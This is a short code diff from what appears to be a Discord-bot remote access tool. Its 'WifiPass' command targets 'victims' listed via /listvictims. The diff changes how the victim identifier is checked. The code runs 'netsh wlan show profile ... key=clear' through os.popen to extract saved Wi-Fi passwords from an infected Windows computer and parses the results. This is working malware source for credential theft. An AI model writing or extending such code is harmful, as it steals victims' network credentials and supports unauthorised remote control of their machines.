@@ -18,7 +18,7 @@ class WifiPass(commands.Cog):
         victim: Identifier of the affected computer (found via /listvictims).
         ssid: The name of the WIFI
         """
-        if str(victim) == str(self.bot.identifier):
+        if self.valid(victim):
             ssid_details = os.popen(f"""netsh wlan show profile "{ssid}" key=clear""").read()
             ciphers = re.findall(r"Cipher\s(.*)", ssid_details)
             ciphers = "/".join([c.strip().strip(":").strip() for c in ciphers])
